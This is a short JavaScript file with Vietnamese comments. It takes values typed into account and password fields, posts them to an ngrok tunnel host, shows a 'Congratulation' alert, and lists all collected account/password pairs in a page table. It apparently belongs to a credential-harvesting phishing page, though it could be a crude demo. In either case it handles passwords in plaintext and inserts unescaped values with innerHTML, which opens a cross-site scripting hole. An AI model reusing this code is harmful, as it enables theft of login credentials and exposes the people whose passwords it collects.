function getData() {
  fetch("https://90f2-222-253-53-33.ngrok-free.app/getData")
    .then((response) => response.json())
    .then((data) => {
      let tableBody = document.querySelector("#dataTable tbody");
      tableBody.innerHTML = ""; // Xóa dữ liệu cũ

      data.forEach((row, index) => {
        let tr = document.createElement("tr");
        tr.innerHTML = `<td>${index + 1}</td><td>${row.ACC}</td><td>${
          row.PASS
        }</td>`;
        tableBody.appendChild(tr);
      });
    });
}
function addData() {
  const ACC = document.getElementById("ACC").value;
  const PASS = document.getElementById("PASS").value;
  fetch("https://90f2-222-253-53-33.ngrok-free.app/addData", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ ACC: ACC, PASS: PASS }),
  })
    .then((response) => response.json())
    .then((data) => {
      alert("Congratulation");
      getData();
    });
}
